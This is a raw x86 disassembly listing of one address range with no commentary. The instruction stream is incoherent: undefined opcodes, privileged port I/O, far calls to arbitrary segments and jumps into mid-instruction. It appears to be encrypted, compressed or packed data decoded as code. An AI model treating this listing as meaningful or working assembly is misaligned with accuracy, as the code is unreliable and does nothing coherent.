  4041e5:	push   edx
  4041e6:	or     DWORD PTR [edx+0x4ea541c6],ebx
  4041ec:	int    0x6b
  4041ee:	mov    bl,0xf0
  4041f0:	pop    esi
  4041f1:	(bad)  
  4041f2:	mov    dh,0x33
  4041f4:	int3   
  4041f5:	stos   BYTE PTR es:[edi],al
  4041f6:	ins    BYTE PTR es:[edi],dx
  4041f7:	sub    dh,BYTE PTR [edx+0x28]
  4041fa:	mov    al,ds:0xaae7a4c6
  4041ff:	aas    
  404200:	xchg   DWORD PTR [ecx],esp
  404202:	sbb    al,0x9c
  404204:	cli    
  404205:	or     edx,edi
  404207:	mov    al,0xdc
  404209:	sbb    DWORD PTR [ebp+0x29],ebp
  40420c:	mov    ebp,0xa7b1f68d
  404211:	loope  0x404250
  404213:	cwde   
  404214:	in     al,0xeb
  404216:	mov    BYTE PTR [ecx-0x2e2ffee8],ch
  40421c:	xor    ecx,eax
  40421e:	jg     0x4041d8
  404220:	cmp    eax,0x650d73e7
  404225:	xchg   edx,eax
  404226:	mul    DWORD PTR [edx]
  404228:	ds in  eax,dx
  40422a:	inc    edi
  40422b:	xor    dl,BYTE PTR [esi]
  40422d:	into   
  40422e:	shl    DWORD PTR gs:[edi-0x76ba7027],0x32
  404236:	sbb    al,0x4b
  404238:	sar    al,1
  40423a:	leave  
  40423b:	xor    DWORD PTR [eax-0x78],edi
  40423e:	and    al,0x2c
  404240:	(bad)  
  404241:	pop    ds
  404242:	mov    ds:0xe6ff1eb4,eax
  404247:	inc    ebp
  404248:	outs   dx,BYTE PTR ds:[esi]
  404249:	jbe    0x40426b
  40424b:	sbb    DWORD PTR [edx-0x41e33c4e],edx
  404251:	fdivr  st,st(6)
  404253:	outs   dx,BYTE PTR ds:[esi]
  404254:	or     BYTE PTR [ecx],ch
  404256:	fimul  DWORD PTR [ecx]
  404258:	icebp  
  404259:	or     BYTE PTR [edx-0x5d],bl
  40425c:	dec    eax
  40425d:	fldpi  
  40425f:	and    esp,0x2f6df903
  404265:	adc    al,0xea
  404267:	jb     0x40422d
  404269:	loopne 0x4041f0
  40426b:	mov    edi,0x2fa5b5ca
  404270:	jg     0x4042e7
  404272:	arpl   WORD PTR [ebp+0x2c],cx
  404275:	mov    ebx,0xd70ccd27
  40427a:	mov    ebp,0xd6565566
  40427f:	popa   
  404280:	adc    eax,0xb2ef5b28
  404285:	add    DWORD PTR [edi-0x70],ecx
  404288:	push   cs
  404289:	ret    
  40428a:	jo     0x404250
  40428c:	jg     0x40422f
  40428e:	in     al,dx
  40428f:	jle    0x40429d
  404291:	or     al,0x1
  404293:	cmp    dh,cl
  404295:	mov    esp,es
  404297:	cmc    
  404298:	sub    BYTE PTR gs:[edx+ecx*2-0x55723a16],bl
  4042a0:	mov    ah,0x39
  4042a2:	add    al,0x44
  4042a4:	jg     0x404242
  4042a6:	call   0x847:0x1a4a3527
  4042ad:	add    esi,ebx
  4042af:	les    esi,FWORD PTR [ebx-0x58e4157a]
  4042b5:	out    0x97,al
  4042b7:	jecxz  0x4042a9
  4042b9:	(bad)  
  4042ba:	pop    ebp
  4042bb:	cmp    DWORD PTR [eax+ecx*8+0x62c0f311],ebp
  4042c2:	and    dl,BYTE PTR [ebp-0x3f119051]
  4042c8:	inc    edx
  4042c9:	cwde   
  4042ca:	mov    bl,0x1b
  4042cc:	loop   0x404341
  4042ce:	jl     0x404330
  4042d0:	pushf  
  4042d1:	pop    edx
  4042d2:	rcr    BYTE PTR [ebp-0x29d089fd],1
  4042d8:	mov    ebx,0x291174b9
  4042dd:	(bad)  
  4042de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042df:	(bad)  
  4042e0:	icebp  
  4042e1:	inc    esi
  4042e2:	and    eax,edx
  4042e4:	add    bh,al
  4042e6:	mov    al,0x67
  4042e8:	mov    edi,0xba872068
  4042ed:	(bad)  
  4042ef:	js     0x404330
  4042f1:	mov    BYTE PTR [ecx],ah
  4042f3:	(bad)  
  4042f4:	mov    esi,DWORD PTR [ebp+0x11]
  4042f7:	add    ebx,DWORD PTR ds:[ebp-0x667c3b65]
  4042fe:	pop    ebp
  4042ff:	lds    edi,FWORD PTR [edx-0x7275c971]
  404305:	add    dh,BYTE PTR gs:0xa985a474
  40430c:	bound  ecx,QWORD PTR [edi]
  40430e:	retf   0x1642
  404311:	and    DWORD PTR fs:[ebx],ebx
  404314:	dec    edi
  404315:	ss fwait
  404317:	test   DWORD PTR [edi+0x65],edi
  40431a:	dec    ecx
  40431b:	(bad)  
  40431c:	in     al,dx
  40431d:	nop
  40431e:	or     edx,DWORD PTR [esi+0x45f2366c]
  404324:	and    ah,BYTE PTR [ecx+0x5f]
  404327:	adc    al,0x5a
  404329:	jae    0x404302
  40432b:	jb     0x404309
  40432d:	out    dx,eax
  40432e:	push   0x8147f76
  404333:	inc    esp
  404334:	mov    ecx,DWORD PTR [eax]
  404336:	add    ecx,0xfffffff8
  404339:	fnsave [esi+eax*1]
  40433c:	ja     0x4042c5
  40433e:	lods   eax,DWORD PTR ds:[esi]
  40433f:	in     al,0x82
  404341:	pop    ds
  404342:	sub    ch,al
  404344:	test   BYTE PTR [edx],dh
  404346:	out    dx,al
  404347:	je     0x4042f8
  404349:	add    edi,DWORD PTR [eax+ecx*8+0x30]
  40434d:	and    esp,edx
  40434f:	dec    edx
  404350:	xlat   BYTE PTR ds:[ebx]
  404351:	push   edi
  404352:	arpl   WORD PTR [esi+ecx*1+0x532a7db3],di
  404359:	fisubr WORD PTR [esi]
  40435b:	pop    ebp
  40435c:	repz pop ds
  40435e:	stc    
  40435f:	cmp    al,0xa2
  404361:	(bad)  
  404362:	ss lahf 
  404364:	enter  0x5731,0x33
  404368:	cmp    BYTE PTR [edi+ecx*2-0x10],bl
  40436c:	stos   DWORD PTR es:[edi],eax
  40436d:	cmp    DWORD PTR [ebx+eiz*2-0x70],esi
  404371:	and    dl,ah
  404373:	je     0x404327
  404375:	sub    eax,0x135ff055
  40437a:	rcl    eax,0xf
  40437d:	fild   DWORD PTR [edi-0x62]
  404380:	(bad)
  404384:	mov    ds:0x9c0c52b,al
  404389:	dec    edi
  40438a:	dec    esp
  40438b:	daa    
  40438c:	fs pushf 
  40438e:	inc    ebx
  40438f:	retf   
  404390:	add    eax,0xa1c9128c
  404396:	adc    DWORD PTR [ecx-0x21],0xeb18063
  40439d:	mov    DWORD PTR [esi+0x6ac04a8a],ecx
  4043a3:	fsubr  DWORD PTR [ebp-0x68]
  4043a6:	mov    dl,0xf9
  4043a8:	push   edi
  4043a9:	(bad)  
  4043aa:	sti    
  4043ab:	(bad)  
  4043ac:	loopne 0x404341
  4043ae:	add    edx,DWORD PTR [edi]
  4043b0:	shl    BYTE PTR [edx-0x177fa7b0],cl
  4043b6:	mov    dh,BYTE PTR [eax-0x37a391b7]
  4043bc:	inc    ebx
  4043bd:	or     al,0xd9
  4043bf:	add    WORD PTR [eax],bx
  4043c2:	adc    eax,0x261580cb
  4043c7:	mov    ds:0x737e34b5,eax
  4043cc:	test   BYTE PTR ss:[bx+di+0x6bb1],bh
  4043d2:	add    BYTE PTR [edx+0x737ea16c],al
  4043d8:	gs es cmp edx,esp
  4043dc:	call   0x36e1:0x9c35489f
  4043e3:	xchg   edi,eax
  4043e4:	jmp    FWORD PTR es:[ebp-0x4b2b6f2]
  4043eb:	rol    ebx,cl
  4043ed:	shl    BYTE PTR [edi],cl
  4043ef:	enter  0x1258,0x46
  4043f3:	sub    BYTE PTR [edx+ecx*4+0x7c4a1a9f],0xfd
  4043fb:	mov    al,ds:0x55dbdbca
  404400:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404401:	and    eax,0x89d9da2f
  404406:	lods   al,BYTE PTR ds:[esi]
  404407:	push   edx
  404408:	mov    DWORD PTR [ecx+edi*8-0x8],esp
  40440c:	ret    0x9fb0
  40440f:	and    al,BYTE PTR [ebp+0x29]
  404412:	aas    
  404413:	adc    dh,BYTE PTR [edx]
  404415:	xor    ah,BYTE PTR [edi-0x4e7030a7]
  40441b:	mov    bh,0x2d
  40441d:	rol    DWORD PTR [esi+ecx*8-0xa],1
  404421:	std    
  404422:	aam    0x62
  404424:	popf   
  404425:	pop    es
  404426:	loop   0x404484
  404428:	jnp    0x4044a3
  40442a:	push   ebp
  40442b:	sbb    DWORD PTR [ebx+0x7e454f1],ecx
  404431:	aad    0xd7
  404433:	cmp    eax,0xe1ddd080
  404438:	xchg   esp,eax
  404439:	aas    
  40443a:	pop    esp
  40443b:	test   eax,0x6ebe5f51
  404440:	cmp    eax,0xa8f49bbf
  404445:	dec    eax
  404446:	clc    
  404447:	mov    ecx,0x25614b76
  40444c:	aas    
  40444d:	hlt    
  40444e:	scas   eax,DWORD PTR es:[edi]
  40444f:	xchg   edi,eax
  404450:	push   eax
  404451:	and    al,0xcf
  404453:	cwde   
  404454:	mov    edx,0x6041e679
  404459:	gs dec edx
  40445b:	cdq    
  40445c:	mov    al,dh
  40445e:	pop    eax
  40445f:	shl    DWORD PTR [ebx-0x5b],cl
  404462:	cmp    dh,BYTE PTR [eax]
  404464:	(bad)  
  404465:	jbe    0x4044c3
  404467:	lahf   
  404468:	(bad)  
  404469:	mov    al,ds:0x88b984e4
  40446e:	popa   
  40446f:	and    dl,dh
  404471:	fwait
  404472:	jbe    0x40446e
  404474:	sbb    esi,DWORD PTR [ebp+0x12]
  404477:	popf   
  404478:	mov    eax,ds:0x88ff641
  40447d:	fistp  DWORD PTR [ebx+ebp*8-0x599e48dd]
  404484:	test   eax,0x92d1460e
  404489:	jbe    0x40447b
  40448b:	cmp    DWORD PTR [eax],esi
  40448d:	rcr    DWORD PTR [ecx+0x58a62095],0x85
  404494:	ret    
  404495:	xlat   BYTE PTR ds:[ebx]
  404496:	mov    ss,edx
  404498:	xor    eax,0x609d6082
  40449d:	lock retf 
  40449f:	mov    ah,0x1c
  4044a1:	ror    edx,cl
  4044a3:	mov    eax,0x256e223
  4044a8:	dec    ebp
  4044a9:	(bad)  
  4044aa:	icebp  
  4044ab:	dec    edi
  4044ac:	xor    eax,0x73b67036
  4044b1:	call   0x8882e84e
  4044b6:	inc    esi
  4044b7:	test   BYTE PTR [ebx+0x62567d27],al
  4044bd:	jnp    0x40446d
  4044bf:	dec    edi
  4044c0:	dec    esi
  4044c1:	aaa    
  4044c2:	xor    dl,ah
  4044c4:	sti    
  4044c5:	cdq    
  4044c6:	shr    DWORD PTR [edx],1
  4044c8:	test   eax,edx
  4044ca:	and    esp,esi
  4044cc:	mov    ecx,0x652344be
  4044d1:	loop   0x4044e5
  4044d3:	jge    0x4044cf
  4044d5:	call   0x3c79:0x956dcbe6
  4044dc:	cmp    al,0xca
  4044de:	mov    ds:0x5e1f7bc6,al
  4044e3:	jecxz  0x404525
  4044e5:	push   edx
  4044e6:	(bad)  
  4044e7:	inc    edx
  4044e8:	(bad)  
  4044e9:	jmp    0x9a57:0x61b90e7f
  4044f0:	mov    ecx,0xf186716
  4044f5:	out    0xb6,eax
  4044f7:	sbb    ebx,DWORD PTR [esi-0x3a]
  4044fa:	scas   al,BYTE PTR es:[edi]
  4044fb:	(bad)  
  4044fc:	jle    0x40450e
  4044fe:	stc    
  4044ff:	outs   dx,DWORD PTR ds:[esi]
  404500:	ja     0x40457e
  404502:	inc    edx
  404503:	(bad)  
  404505:	push   edx
  404506:	hlt    
  404507:	jl     0x404559
  404509:	cmc    
  40450a:	scas   eax,DWORD PTR es:[edi]
  40450b:	(bad)  
  40450d:	bound  ecx,QWORD PTR [esi]
  40450f:	clc    
  404510:	mov    ebp,DWORD PTR [edi+esi*2+0x13cecd5]
  404517:	iret   
  404518:	(bad)  
  404519:	out    0x25,eax
  40451b:	loop   0x404567
  40451d:	pop    edi
  40451e:	clc    
  40451f:	fiadd  WORD PTR [eax]
  404521:	sbb    DWORD PTR [ebx+0x37],eax
  404524:	lahf   
  404525:	mov    al,ds:0x72881af0
  40452a:	pop    esp
  40452b:	push   0x30
  40452d:	mov    ch,0x29
  40452f:	leave  
  404530:	adc    edi,edx
  404532:	dec    esp
  404533:	test   BYTE PTR [edx],ah
  404535:	sahf   
  404536:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404537:	jecxz  0x4045ac
  404539:	inc    esp
  40453a:	mov    dh,0x7d
  40453c:	sahf   
  40453d:	push   ebx
  40453e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40453f:	fsub   QWORD PTR [ebx]
  404541:	push   cs
  404542:	inc    esi
  404543:	bound  esi,QWORD PTR [edi]
  404545:	or     esi,DWORD PTR [ecx]
  404547:	mov    ds:0x5fa73a6b,eax
  40454c:	xor    bh,BYTE PTR [edi+0x52a588b3]
  404552:	fisub  DWORD PTR [eax+edi*1]
  404555:	sbb    dh,BYTE PTR [ebx+0x5a5d0ffc]
  40455b:	fmul   QWORD PTR [ebp+0x7852cd41]
  404561:	mov    dh,0x13
  404563:	mov    edx,0x3e275942
  404568:	mov    ebp,0x60bb062a
  40456d:	inc    ebx
  40456e:	pushf  
  40456f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404570:	lock arpl WORD PTR [edi],dx
  404573:	(bad)  
  404574:	icebp  
  404575:	or     al,0x40
  404577:	(bad)  
  404579:	push   0xffffff88
  40457b:	aam    0x6d
  40457d:	xchg   ecx,eax
  40457e:	rol    edx,cl
  404580:	push   0x48
  404582:	mov    cl,BYTE PTR [edi]
  404584:	mov    DWORD PTR [esi-0x4387e02e],0xce8e91a6
  40458e:	ins    BYTE PTR es:[edi],dx
  40458f:	retf   0x4d3b
  404592:	xor    BYTE PTR [ecx-0x6099995b],ah
  404598:	and    DWORD PTR ds:0xf7054eb8,esi
  40459e:	(bad)  
  40459f:	enter  0x6c3e,0xd5
  4045a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045a4:	and    eax,0x73551698
  4045a9:	les    ebx,FWORD PTR [edx+0x68]
  4045ac:	push   0xaafa1d58
  4045b1:	(bad)  
  4045b2:	sti    
  4045b3:	pushf  
  4045b4:	pop    esp
  4045b5:	mov    ch,0xb2
  4045b7:	sahf   
  4045b8:	push   ebp
  4045b9:	jp     0x4045f3
  4045bb:	add    dh,bl
  4045bd:	adc    dl,dl
  4045bf:	mov    bh,0x38
  4045c1:	ins    DWORD PTR es:[edi],dx
  4045c2:	sti    
  4045c3:	jmp    0x61812072
  4045c8:	and    ah,BYTE PTR [eax+0x33]
  4045cb:	mov    eax,0xb2145832
  4045d0:	adc    al,0xcd
  4045d2:	jo     0x4045fc
  4045d4:	adc    esp,DWORD PTR [edx-0x4edcc108]
  4045da:	mov    eax,0x2a48b93f
  4045df:	not    BYTE PTR [eax+0x4fe9a583]
  4045e5:	mov    WORD PTR [ecx+ecx*2],es
  4045e8:	adc    BYTE PTR [edx],0x21
  4045eb:	dec    eax
  4045ec:	loope  0x40465a
  4045ee:	out    0x8b,al
  4045f0:	repz xchg ebp,eax
  4045f2:	pop    ebx
  4045f3:	push   ecx
  4045f4:	lahf   
  4045f5:	cmc    
  4045f6:	mov    bh,0x6a
  4045f8:	addr16 dec ebx
  4045fa:	pop    ds
  4045fb:	outs   dx,BYTE PTR ds:[esi]
  4045fc:	sub    edx,esp
  4045fe:	icebp  
  4045ff:	dec    edx
  404600:	ins    BYTE PTR es:[edi],dx
  404601:	mov    edx,0x4ce9137e
  404606:	adc    edx,edi
  404608:	das    
  404609:	inc    edi
  40460a:	sub    cl,BYTE PTR [ebx-0x6278bb0c]
  404610:	xchg   ebx,eax
  404611:	push   edx
  404612:	mov    BYTE PTR [eax+0x2c81ec69],dh
  404618:	lods   eax,DWORD PTR ds:[esi]
  404619:	dec    eax
  40461a:	ret    0x3353
  40461d:	add    DWORD PTR [ebx],edi
  40461f:	sub    ecx,esi
  404621:	xchg   edi,eax
  404622:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404623:	dec    ebx
  404624:	outs   dx,BYTE PTR ds:[esi]
  404625:	dec    ebp
  404626:	shr    BYTE PTR [eax-0x32],cl
  404629:	gs jle 0x404624
  40462c:	xchg   ecx,eax
  40462d:	nop
  40462e:	in     al,0x10
  404630:	mov    dl,0x7c
  404632:	fsubr  st,st(4)
  404634:	jno    0x4045d7
  404636:	push   es
  404637:	jle    0x404611
  404639:	mov    bh,0xfc
  40463b:	cmp    ecx,DWORD PTR [ecx-0x11]
  40463e:	or     cl,BYTE PTR [esi-0x6e]
  404641:	out    dx,eax
  404642:	pop    ds
  404643:	sbb    DWORD PTR [edi+eiz*2+0x78],eax
  404647:	mov    dh,0xfd
  404649:	shl    cl,cl
  40464b:	dec    eax
  40464c:	mov    ds,WORD PTR [ebp-0x4d]
  40464f:	stc    
  404650:	(bad)
  404653:	(bad)  [ecx+0x5e726fcd]
  404659:	test   DWORD PTR [eax+0x10],esp
  40465c:	out    dx,eax
  40465d:	(bad)  
  40465e:	sti    
  40465f:	cld    
  404660:	imul   eax,DWORD PTR [edx+ebx*4+0x4350d6eb],0xffffffc8
  404668:	icebp  
  404669:	jmp    0x79a0:0x6183c415
  404670:	cmp    al,BYTE PTR [esi-0x2b490404]
  404676:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404677:	sbb    ecx,esi
  404679:	mov    dl,0xe7
  40467b:	dec    edi
  40467c:	or     al,BYTE PTR [ecx-0x5a]
  40467f:	or     al,0xee
  404681:	pop    ds
  404682:	cmp    esp,esp
  404684:	clc    
  404685:	sub    al,0x41
  404687:	mov    esp,0x9295d142
  40468c:	pop    edi
  40468d:	bound  edi,QWORD PTR [edx+0x19]
  404690:	pop    ss
  404691:	sbb    eax,0xfec59370
  404696:	rcr    BYTE PTR [ebx],1
  404698:	stos   BYTE PTR es:[edi],al
  404699:	fnsave ds:0x6180768b
  40469f:	jbe    0x4046c9
  4046a1:	inc    edx
  4046a2:	add    eax,0x221d6c88
  4046a7:	mov    edi,0xb56e3b58
  4046ac:	mov    eax,ds:0x107d0de3
  4046b1:	out    dx,eax
  4046b2:	jmp    0x40468b
  4046b4:	mov    bl,0xd4
  4046b6:	out    0xe5,al
  4046b8:	mov    ch,BYTE PTR [ebx]
  4046ba:	clc    
  4046bb:	push   ss
  4046bc:	out    0x23,al
  4046be:	loope  0x40464d
  4046c0:	xlat   BYTE PTR ds:[ebx]
  4046c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046c2:	clc    
  4046c3:	popa   
  4046c4:	loop   0x40471b
  4046c6:	lods   al,BYTE PTR ds:[esi]
  4046c7:	inc    ebp
  4046c8:	dec    esp
  4046c9:	leave  
  4046ca:	lods   eax,DWORD PTR ds:[esi]
  4046cb:	popa   
  4046cc:	(bad)  [ecx+0x4d06f022]
  4046d2:	sbb    cl,BYTE PTR [ebx-0x79]
  4046d5:	mov    ebx,0xbf5393a2
  4046da:	and    eax,edi
  4046dc:	das    
  4046dd:	outs   dx,DWORD PTR ds:[esi]
  4046de:	aad    0x54
  4046e0:	in     al,dx
  4046e1:	mov    cl,0xb5
  4046e3:	dec    ebx
  4046e4:	das    
  4046e5:	mov    al,0x84
  4046e7:	mov    eax,ds:0x89d49945
  4046ec:	(bad)
  4046ef:	(bad)  
  4046f0:	mov    esi,0x2351c3a3
  4046f5:	mov    dh,BYTE PTR [edx+0x73dd8c88]
  4046fb:	neg    BYTE PTR [eax+eiz*2-0x68]
  4046ff:	mov    al,ds:0xedca20e
  404704:	js     0x4046ef
  404706:	scas   eax,DWORD PTR es:[edi]
  404707:	mov    ds:0x103ed003,eax
  40470c:	xchg   ebx,eax
  40470d:	scas   eax,DWORD PTR es:[edi]
  40470e:	sahf   
  40470f:	lods   eax,DWORD PTR ds:[esi]
  404710:	fld    QWORD PTR [ebx-0x71]
  404713:	inc    edi
  404714:	jae    0x404706
  404716:	(bad)  
  404717:	mov    ebx,0x7e945075
  40471c:	pop    edi
  40471d:	and    BYTE PTR [ebp+0x7f],cl
  404720:	inc    ebx
  404721:	adc    BYTE PTR [eax],dl
  404723:	pop    ebx
  404724:	or     BYTE PTR [esi+0x1faf05e1],0x6c
  40472b:	imul   ebx,DWORD PTR [eax-0x73],0x21
  40472f:	xchg   BYTE PTR [edx-0xba14d0c],bh
  404735:	out    dx,al
  404736:	in     eax,0xb
  404738:	sub    eax,0x1d4fcc9f
  40473d:	jae    0x40475a
  40473f:	jecxz  0x4046f7
  404741:	jno    0x4047b7
  404743:	clc    
  404744:	push   eax
  404745:	(bad)  [ebx-0x10f03f8e]
  40474b:	sub    al,cl
  40474d:	test   DWORD PTR [esi+0x140ac1dd],edi
  404753:	ins    DWORD PTR es:[edi],dx
  404754:	fs dec ebx
  404756:	retf   
  404757:	clc    
  404758:	mov    ds:0x94cb40b2,eax
  40475d:	sbb    esi,esi
  40475f:	enter  0xae05,0xbf
  404763:	or     BYTE PTR [ebx-0x68],dl
  404766:	mov    edi,0x71fffe8e
  40476b:	popf   
  40476c:	test   eax,0x28515a92
  404771:	loop   0x40477d
  404773:	dec    edi
  404774:	mov    ecx,0xa780518c
  404779:	push   ebx
  40477a:	push   eax
  40477b:	adc    esp,DWORD PTR [ecx]
  40477d:	cmp    BYTE PTR [edx],bl
  40477f:	retf   
  404780:	cld    
  404781:	pop    ebp
  404782:	mov    esp,es
  404784:	repnz mov dh,0x3d
  404787:	push   0xffffffad
  404789:	call   0x86bb2db4
  40478e:	cmc    
  40478f:	jge    0x404800
  404791:	fwait
  404792:	stos   DWORD PTR es:[edi],eax
  404793:	inc    ecx
  404794:	or     DWORD PTR [edi+0x16],0x3cde3825
  40479b:	fst    QWORD PTR [esi]
  40479d:	sub    ah,BYTE PTR [ecx]
  40479f:	mov    bl,0x5d
  4047a1:	ret    
  4047a2:	adc    bh,BYTE PTR fs:[ebp+edi*8-0x4d]
  4047a7:	pop    esp
  4047a8:	cmp    al,0x50
  4047aa:	mov    ecx,0xfd9ad8c5
  4047af:	mov    edi,0x681f8e01
  4047b4:	add    DWORD PTR [eax-0x6e05a47f],0x0
  4047bb:	cs pushf 
  4047bd:	xor    esp,DWORD PTR [esi]
  4047bf:	xor    bh,BYTE PTR [edx]
  4047c1:	stc    
  4047c2:	outs   dx,BYTE PTR ds:[esi]
  4047c3:	push   0x8d8566a0
  4047c8:	or     al,BYTE PTR [edx+0x2]
  4047cb:	xor    eax,0xceb198b2
  4047d0:	outs   dx,BYTE PTR ds:[esi]
  4047d1:	jge    0x40478c
  4047d3:	push   0x3d00125c
  4047d8:	cmp    al,0xc8
  4047da:	cli    
  4047db:	jns    0x40479b
  4047dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047de:	cs xchg dh,bl
  4047e1:	sub    al,0x5b
  4047e3:	sbb    DWORD PTR [edx+ecx*1-0x63a42dbc],ecx
  4047ea:	stc    
  4047eb:	xchg   esi,eax
  4047ec:	add    al,0x62
  4047ee:	push   esp
  4047ef:	lds    esi,FWORD PTR [edi-0x3b]
  4047f2:	jl     0x40486d
  4047f4:	mov    edi,0x5faff38e
  4047f9:	pop    ecx
  4047fa:	js     0x404876
  4047fc:	xchg   ecx,eax
  4047fd:	jle    0x404824
  4047ff:	xor    BYTE PTR [ecx+0x27],bl
  404802:	inc    eax
  404803:	and    al,0xd4
  404805:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404806:	lea    edx,[edi-0x1588a97a]
  40480c:	jle    0x4047e5
  40480e:	pop    ebp
  40480f:	inc    ecx
  404810:	mov    WORD PTR [ebp-0x49330426],cs
  404816:	in     eax,dx
  404817:	sub    ecx,ebx
  404819:	ss popf 
  40481b:	jge    0x4047d3
  40481d:	pusha  
  40481e:	and    DWORD PTR [ebx+0x55],esi
  404821:	shl    ebx,1
  404823:	test   eax,0x6e8e9ff2
  404828:	xchg   ebx,eax
  404829:	loopne 0x40489d
  40482b:	retf   0x37d4
  40482e:	sub    BYTE PTR [eax+ebx*8-0x42be8084],ch
  404835:	and    eax,0x1a5200fb
  40483a:	lea    ebx,[esp+eax*1-0x79]
  40483e:	pop    edx
  40483f:	sub    DWORD PTR [eax+0x4527094c],edi
  404845:	mov    ?,WORD PTR [esi+0x4fc75a0b]
  40484b:	inc    edi
  40484c:	mov    bl,0xcd
  40484e:	sbb    BYTE PTR [edi+0x53b02ac1],ch
  404854:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404855:	lea    edi,[edx-0x169c3892]
  40485b:	imul   ebx,esp,0x3e
  40485e:	sub    al,BYTE PTR [ebp+eiz*1+0x5b58fda6]
  404865:	jg     0x40487c
  404867:	fistp  DWORD PTR [eax]
  404869:	xchg   ebx,eax
  40486a:	xor    eax,0x380ac6ae
  40486f:	lods   al,BYTE PTR ds:[esi]
  404870:	jge    0x404820
  404872:	xor    bl,BYTE PTR [edx-0x1a]
  404875:	mov    ah,0x49
  404877:	or     BYTE PTR [edi],0xea
  40487a:	dec    eax
  40487b:	dec    esp
  40487c:	add    ebx,eax
  40487e:	dec    ebp
  40487f:	xlat   BYTE PTR ds:[ebx]
  404880:	inc    esp
  404881:	aam    0x1b
  404883:	pusha  
  404884:	rol    DWORD PTR [ebp-0x51],0x70
  404888:	mov    eax,ds:0x7556e44c
  40488d:	lds    edx,FWORD PTR [edx-0x28f1bba5]
  404893:	mov    esp,0xc6bc21cb
  404898:	pop    edx
  404899:	or     eax,0x82555f2f
  40489e:	aas    
  40489f:	or     DWORD PTR [ecx+0x35],edi
  4048a2:	add    BYTE PTR [esi],dl
  4048a4:	retf   0xbe1
  4048a7:	dec    edi
  4048a8:	rcl    BYTE PTR [edi],0xf0
  4048ab:	push   ss
  4048ac:	mov    esi,0x6bcf61e9
  4048b1:	repnz and DWORD PTR [edx+0x2379c23a],ebp
  4048b8:	rol    BYTE PTR [ebx-0x19],1
  4048bb:	aad    0xb6
  4048bd:	jle    0x4048b8
  4048bf:	and    bh,BYTE PTR ds:0xb1077e0
  4048c5:	push   edi
  4048c6:	mov    eax,ds:0xd6020f2b
  4048cb:	mul    ebx
  4048cd:	push   0xffffffb9
  4048cf:	fnsave [esi]
  4048d1:	aas    
  4048d2:	jno    0x4048ec
  4048d4:	jae    0x4048b9
  4048d6:	mov    eax,0xfd046f38
  4048db:	ins    BYTE PTR es:[edi],dx
  4048dc:	jae    0x4048b9
  4048de:	rcl    bh,1
  4048e0:	bound  ebp,QWORD PTR [eax+0x21]
  4048e3:	xchg   DWORD PTR [ebp+0x4f],edx
  4048e6:	cld    
  4048e7:	fdivr  DWORD PTR [ecx]
  4048e9:	lock js 0x404898
  4048ec:	cld    
  4048ed:	push   edx
  4048ee:	jle    0x404895
  4048f0:	add    eax,0x53637fce
  4048f5:	xor    al,0x80
  4048f7:	sbb    DWORD PTR [ecx-0x7fc0968],ecx
  4048fd:	add    esi,ebp
  4048ff:	cmp    al,0x58
  404901:	ds ds pop eax
  404904:	sub    eax,0x8784a9c5
  404909:	adc    al,al
  40490b:	push   0xffffffe7
  40490d:	ins    DWORD PTR es:[edi],dx
  40490e:	into   
  40490f:	inc    esi
  404910:	js     0x404943
  404912:	inc    esp
  404913:	push   0x76139ff9
  404918:	adc    eax,esp
  40491a:	jp     0x404989
  40491c:	mov    ebx,esp
  40491e:	mov    ds:0xedb4857d,al
  404923:	mov    es,WORD PTR [ebp+0x7d2a6c0d]
  404929:	or     BYTE PTR [edx],dl
  40492b:	push   es
  40492c:	fist   DWORD PTR [eax+0x7946fce8]
  404932:	xor    BYTE PTR [ecx-0x102a3341],al
  404938:	(bad)  
  404939:	jae    0x4048f7
  40493b:	arpl   WORD PTR [edx],cx
  40493d:	loope  0x404937
  40493f:	sbb    eax,0x39ee318e
  404944:	rol    DWORD PTR [ebx],cl
  404946:	fst    st(1)
  404948:	push   cs
  404949:	sahf   
  40494a:	adc    ecx,DWORD PTR [edx+0x79]
  40494d:	xor    DWORD PTR [edi],edx
  40494f:	xchg   ebp,eax
  404950:	xchg   ebp,eax
  404951:	icebp  
  404952:	mov    esp,0xf3989e97
  404957:	xchg   edx,eax
  404958:	rol    BYTE PTR [edx-0x12],cl
  40495b:	int    0x23
  40495d:	or     al,BYTE PTR [ecx]
  40495f:	mov    ecx,0x580438f7
  404964:	lahf   
  404965:	enter  0x69fe,0x46
  404969:	ss cmps DWORD PTR es:[esi],DWORD PTR es:[edi]
  40496c:	jecxz  0x404943
  40496e:	popa   
  40496f:	adc    BYTE PTR [esi+eax*2+0x78],0x40
  404974:	xchg   BYTE PTR [esi-0x3c27b3b0],ah
  40497a:	jns    0x404992
  40497c:	inc    edi
  40497d:	test   BYTE PTR ds:0xc10c9313,cl
  404983:	hlt    
  404984:	mov    eax,0xb03e2b4
  404989:	mov    ecx,0x5152451f
  40498e:	ds fwait
  404990:	push   0xffffffbf
  404992:	out    0xe6,al
  404994:	int3   
  404995:	ins    BYTE PTR es:[edi],dx
  404996:	outs   dx,DWORD PTR ds:[esi]
  404997:	push   edi
  404998:	je     0x404934
  40499a:	lds    edx,FWORD PTR [esi+0x7532c81f]
  4049a0:	mov    ds:0x88302565,al
  4049a5:	int3   
  4049a6:	retf   
  4049a7:	push   ds
  4049a8:	es add ebp,esi
  4049ab:	and    dl,BYTE PTR [ecx+0x48]
  4049ae:	push   0x6c
  4049b0:	fsubr  st(3),st
  4049b2:	popa   
  4049b3:	mov    dl,0xcd
  4049b5:	cdq    
  4049b6:	xor    ebx,DWORD PTR [esi-0x3951b817]
  4049bc:	(bad)  
  4049be:	cmp    DWORD PTR [esi],esp
  4049c0:	iret   
  4049c1:	jle    0x404a38
  4049c3:	lods   eax,DWORD PTR ds:[esi]
  4049c4:	dec    edx
  4049c5:	mov    bh,BYTE PTR [ecx-0x56]
  4049c8:	sub    BYTE PTR gs:[ebp+0x56d36112],bl
  4049cf:	push   es
